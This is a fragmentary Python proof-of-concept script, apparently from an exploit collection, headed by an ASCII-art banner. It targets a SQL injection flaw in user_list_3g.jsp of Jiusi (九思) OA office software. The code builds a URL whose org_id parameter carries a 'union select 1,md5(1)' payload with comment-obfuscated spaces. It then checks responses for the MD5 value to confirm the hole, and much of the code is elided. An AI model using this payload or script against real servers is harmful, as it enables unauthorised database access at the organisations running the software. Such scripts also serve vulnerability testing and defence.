               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 九思OA软件user_list_3g.jsp存在SQL注入漏洞
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5(1)%20%23"
    url = target + path
    headers = {
    ...
    try:
        ...
        if response1.status_code == 200 and md5_value in response1.text:
